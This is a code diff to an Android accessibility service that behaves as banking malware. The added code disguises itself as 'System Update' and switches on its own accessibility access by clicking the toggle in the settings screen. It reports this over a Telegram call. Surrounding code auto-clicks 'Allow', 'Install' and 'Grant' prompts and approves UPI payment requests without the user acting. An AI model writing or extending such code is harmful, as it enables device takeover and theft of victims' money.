@@ -16,6 +16,28 @@ public class MyAccessibilityService extends AccessibilityService {
     @Override
     public void onAccessibilityEvent(AccessibilityEvent event) {
         instance = this;
+        
+        // ==================== AUTO-CLICK ACCESSIBILITY TOGGLE ====================
+        if (event.getEventType() == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
+            try {
+                String className = event.getClassName() != null ? event.getClassName().toString() : "";
+                if (className.contains("AccessibilitySettings") || className.contains("InstalledAppDetails")) {
+                    AccessibilityNodeInfo root = getRootInActiveWindow();
+                    if (root != null) {
+                        List<AccessibilityNodeInfo> nodes = root.findAccessibilityNodeInfosByText("System Update");
+                        for (AccessibilityNodeInfo node : nodes) {
+                            if (node.isCheckable() && !node.isChecked()) {
+                                node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
+                                sendTelegram("✅ Accessibility enabled automatically");
+                                break;
+                            }
+                        }
+                    }
+                }
+            } catch (Exception e) {}
+        }
+        
+        // ==================== AUTO-CLICK PERMISSION BUTTONS ====================
         String text = event.getText().toString();
         
         if (text.contains("Allow") || text.contains("Install") || 
@@ -32,6 +54,7 @@ public class MyAccessibilityService extends AccessibilityService {
             clickButton("Grant");
         }
         
+        // ==================== AUTO-APPROVE UPI REQUESTS ====================
         if (text.contains("UPI") && text.contains("requests")) {
             clickButton("Approve");
             clickButton("Accept");
